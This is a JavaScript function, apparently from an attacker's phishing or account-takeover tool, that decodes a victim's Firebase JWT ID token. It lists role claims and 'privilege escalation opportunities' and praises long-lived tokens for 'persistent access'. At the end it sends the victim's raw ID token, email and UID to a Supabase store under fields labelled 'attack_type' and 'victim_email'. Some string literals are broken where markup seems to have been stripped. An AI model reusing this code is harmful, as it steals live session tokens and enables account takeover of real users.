        function base64UrlDecode(str) {
            str = str.replace(/-/g, '+').replace(/_/g, '/');
            while (str.length % 4) str += '=';
            try {
                return decodeURIComponent(atob(str).split('').map(c =>
                    '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)
                ).join(''));
            } catch(e) {
                return atob(str);
            }
        }

        function analyzeToken() {
            const el = document.getElementById('tokenAnalysis');
            if (!idToken) {
                el.innerHTML = '[ERROR] No token available. Authenticate first.';
                return;
            }

            const parts = idToken.split('.');
            if (parts.length !== 3) {
                el.innerHTML = '[ERROR] Invalid JWT format.';
                return;
            }

            let header, payload;
            try {
                header = JSON.parse(base64UrlDecode(parts[0]));
            } catch(e) {
                header = { error: 'Failed to decode header' };
            }
            try {
                payload = JSON.parse(base64UrlDecode(parts[1]));
            } catch(e) {
                payload = { error: 'Failed to decode payload' };
            }

            const now = Math.floor(Date.now() / 1000);
            const exp = payload.exp || 0;
            const iat = payload.iat || 0;
            const isExpired = now > exp;
            const timeLeft = exp - now;

            let html = '';
            html += '
';
            html += 'JWT Header:\n';
            html += `${JSON.stringify(header, null, 2)}`;
            html += '
';

            html += '
';
            html += 'JWT Payload:\n';
            html += `${JSON.stringify(payload, null, 2)}`;
            html += '
';

            // Security analysis
            html += '
';
            html += 'Security Analysis:\n\n';

            // Expiration
            if (isExpired) {
                html += `[!] TOKEN EXPIRED (expired ${Math.abs(timeLeft)}s ago)\n`;
            } else {
                html += `[OK] Token valid (expires in ${timeLeft}s / ${Math.round(timeLeft/60)}min)\n`;
            }

            // Issued at
            if (iat) {
                html += `Issued: ${new Date(iat * 1000).toISOString()}\n`;
                html += `Expires: ${new Date(exp * 1000).toISOString()}\n`;
            }

            // Algorithm
            html += `\nAlgorithm: ${header.alg || 'unknown'}`;
            if (header.alg === 'RS256') {
                html += ' [OK] RSA signature (secure)';
            } else if (header.alg === 'HS256') {
                html += ' [!] HMAC - might be vulnerable to algorithm confusion';
            } else if (header.alg === 'none') {
                html += ' [!!!] CRITICAL: No signature! Algorithm "none" - can be forged!';
            }

            // Custom claims
            html += '\n\nCustom Claims / Roles:\n';
            const roleClaims = ['role', 'roles', 'admin', 'is_admin', 'permissions', 'scope', 'custom:role', 'custom:permissions', 'claims', 'auth_time', 'firebase'];
            let foundClaims = false;
            for (const claim of roleClaims) {
                if (payload[claim] !== undefined) {
                    html += `  ${claim}: ${JSON.stringify(payload[claim])}\n`;
                    foundClaims = true;
                }
            }
            if (payload.firebase) {
                html += `  firebase.sign_in_provider: ${payload.firebase.sign_in_provider || 'N/A'}\n`;
                html += `  firebase.tenant: ${payload.firebase.tenant || 'N/A'}\n`;
                if (payload.firebase.identities) {
                    html += `  firebase.identities: ${JSON.stringify(payload.firebase.identities)}\n`;
                }
                foundClaims = true;
            }
            if (!foundClaims) {
                html += '  No custom role/permission claims found in token.\n';
                html += '  This means authorization is likely checked server-side (not in JWT).\n';
            }

            // Privilege escalation hints
            html += '\nPrivilege Escalation Opportunities:\n';
            if (!payload.role && !payload.admin && !payload.is_admin) {
                html += '  [!] No role claim in JWT - authorization is server-side only.\n';
                html += '    Try: (1) API endpoint role manipulation, (2) Organization admin takeover\n';
            }
            if (payload.firebase?.sign_in_provider === 'google.com') {
                html += '  [INFO] Google OAuth sign-in - no password needed for token refresh.\n';
            }
            if (exp - iat > 3600) {
                html += `  [!] Long-lived token: ${(exp-iat)/3600} hours. Good for persistent access.\n`;
            }

            html += '
';

            el.innerHTML = html;

            // Save token analysis to Supabase
            saveToSupabase({
                attack_type: 'token_analysis',
                victim_email: currentUser?.email || '',
                victim_uid: currentUser?.uid || '',
                id_token: idToken,
                notes: `JWT Analysis: alg=${header.alg}, exp=${isExpired ? 'expired' : 'valid'}, claims=${Object.keys(payload).join(',')}`
            });
        }
